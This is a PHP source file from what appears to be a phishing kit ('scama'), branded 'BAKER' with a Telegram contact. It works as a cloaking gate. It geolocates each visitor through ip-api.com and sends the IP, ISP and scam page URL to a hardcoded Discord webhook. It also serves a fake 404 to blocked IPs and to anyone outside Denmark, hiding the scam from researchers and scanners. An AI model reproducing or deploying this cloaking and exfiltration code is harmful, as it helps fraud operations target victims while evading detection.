<?php

/*

██████╗  █████╗ ██╗  ██╗███████╗██████╗ 
██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
██████╔╝███████║█████╔╝ █████╗  ██████╔╝
██╔══██╗██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝██║  ██║██║  ██╗███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ https://t.me/BAK34_TMW
                                                                                              
*/

session_start();

include 'bak3r.php';

$webhook_ipblockees = "https://discord.com/api/webhooks/115844716666654248032346/zFy19W-xbKkeoJ4Z8iKS62DIGMkGamAcnVqfpc54Fq0tUW1Axo1kEAjpXpO28qtaVKrw";
$ip = $_SERVER['REMOTE_ADDR'];

function getIpInfo($ip = '')
{
    $ipinfo = file_get_contents("http://ip-api.com/json/" . $ip);
    $ipinfo_json = json_decode($ipinfo, true);
    return $ipinfo_json;
}

$visitor_ip = $_SERVER['REMOTE_ADDR'];
$ipinfo_json = getIpInfo($visitor_ip);

if ($ipinfo_json['status'] != 'fail') {
    $org = "{$ipinfo_json['as']}";
    $isps = "{$ipinfo_json['isp']}";
    $country = "{$ipinfo_json['country']}";
} else {
    $org = "Introuvable";
    $isps = "Introuvable";
    $country = "Unknown";
}

if (in_array($ip, $blocked_ips) || ($blocker == "on" && strtolower($country) !== "denmark" && !in_array($ip, $allowed_ips))) {
    $entetedc = ['Content-Type: application/json; charset=utf-8'];
    $POST = [
        'username' => 'ANTIBOTS',
        'content' => '
⛔ ACCESS BLOCKED ⛔ 

🌐 ISP : ' . $isps . '
🌐 IP ADDRESS : ' . $ip . '

🚀 SCAMA : ' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF']
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $webhook_ipblockees);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $entetedc);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
    $response = curl_exec($ch);

    header("HTTP/1.0 404 Not Found");
    die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
